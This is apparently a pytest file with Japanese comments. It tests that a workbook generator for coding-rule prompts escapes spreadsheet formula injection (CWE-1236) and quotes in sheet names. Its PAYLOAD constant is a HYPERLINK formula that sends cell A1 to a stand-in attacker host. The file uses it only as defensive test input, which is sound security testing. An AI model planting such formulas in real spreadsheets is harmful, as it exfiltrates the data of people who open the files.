"""数式インジェクション対策のテスト（CWE-1236）。

入力 Excel のセル値は生成されるワークブックへ転記される。openpyxl は
先頭が "=" の文字列を数式として書き出すため、対策がないと、生成物を
開いた利用者の環境で入力側が仕込んだ数式が評価される。
"""

from pathlib import Path

from openpyxl import Workbook, load_workbook

from coding_policy_prompt_generator.excel_io import (
    ColumnConfig,
    _escape_formula_string,
    _hyperlink_formula,
    generate_prompts,
)

PAYLOAD = '=HYPERLINK("http://attacker.example/?d="&A1,"click")'


def _make_input(path: Path, *, rule_id: str, summary: str, category: str = "") -> None:
    wb = Workbook()
    ws = wb.active
    ws.title = "コーディング規約一覧"
    ws.cell(row=1, column=1, value="説明")
    ws.cell(row=2, column=1, value="説明2")
    for col, name in enumerate(["項番", "分類", "カテゴリ", "概要", "説明"], start=1):
        ws.cell(row=3, column=col, value=name)
    ws.cell(row=4, column=1, value=rule_id)
    ws.cell(row=4, column=3, value=category)
    ws.cell(row=4, column=4, value=summary)
    ws.cell(row=4, column=5, value="補足")
    wb.save(path)


def _generate(tmp_path: Path, **kwargs) -> Path:
    input_path = tmp_path / "input.xlsx"
    output_path = tmp_path / "output.xlsx"
    _make_input(input_path, **kwargs)
    generate_prompts(
        input_path=input_path,
        output_path=output_path,
        index_sheet="コーディング規約一覧",
        header_row=3,
        columns=ColumnConfig(
            id_column="項番",
            summary_column="概要",
            description_column="説明",
            link_column="説明",
        ),
        sheet_prefix="PROMPT_",
        dry_run=False,
    )
    return output_path


class TestFormulaInjection:
    def test_payload_in_summary_is_not_written_as_formula(self, tmp_path: Path) -> None:
        output = _generate(tmp_path, rule_id="N-001", summary=PAYLOAD)
        ws = load_workbook(output)["コーディング規約一覧"]

        cell = ws.cell(row=4, column=4)
        assert cell.data_type == "s"
        assert cell.value == PAYLOAD  # 値は欠落・改変されない

    def test_payload_in_rule_id_is_not_written_as_formula(self, tmp_path: Path) -> None:
        output = _generate(tmp_path, rule_id=PAYLOAD, summary="概要")
        ws = load_workbook(output)["コーディング規約一覧"]

        assert ws.cell(row=4, column=1).data_type == "s"

    def test_payload_in_category_is_not_written_as_formula(self, tmp_path: Path) -> None:
        output = _generate(tmp_path, rule_id="N-001", summary="概要", category=PAYLOAD)
        ws = load_workbook(output)["コーディング規約一覧"]

        assert ws.cell(row=4, column=3).data_type == "s"

    def test_no_data_cell_is_a_formula(self, tmp_path: Path) -> None:
        """索引シートで数式なのはハイパーリンク列だけであること。"""
        output = _generate(tmp_path, rule_id=PAYLOAD, summary=PAYLOAD, category=PAYLOAD)
        ws = load_workbook(output)["コーディング規約一覧"]

        formula_columns = [
            col for col in range(1, 6) if ws.cell(row=4, column=col).data_type == "f"
        ]
        assert formula_columns == [5]

    def test_normal_values_are_unchanged(self, tmp_path: Path) -> None:
        output = _generate(tmp_path, rule_id="N-001", summary="通常の概要")
        ws = load_workbook(output)["コーディング規約一覧"]

        assert ws.cell(row=4, column=1).value == "N-001"
        assert ws.cell(row=4, column=4).value == "通常の概要"


class TestHyperlinkFormulaEscaping:
    def test_double_quote_is_escaped(self) -> None:
        """シート名の `"` で数式の文字列リテラルから抜け出せないこと。"""
        formula = _hyperlink_formula('PROMPT_N-001"&A1&"')

        # リテラル外に裸の `"` が残っていない = 引用符の数が偶数
        assert formula.count('"') % 2 == 0
        assert '""' in formula

    def test_single_quote_is_still_escaped(self) -> None:
        """既存のシート名エスケープを壊していないこと。"""
        assert "''" in _hyperlink_formula("PROMPT_O'Brien")

    def test_plain_sheet_name(self) -> None:
        assert _hyperlink_formula("PROMPT_N-001") == '=HYPERLINK("#\'PROMPT_N-001\'!A1","詳細")'

    def test_escape_helper(self) -> None:
        assert _escape_formula_string('a"b') == 'a""b'
        assert _escape_formula_string("ab") == "ab"
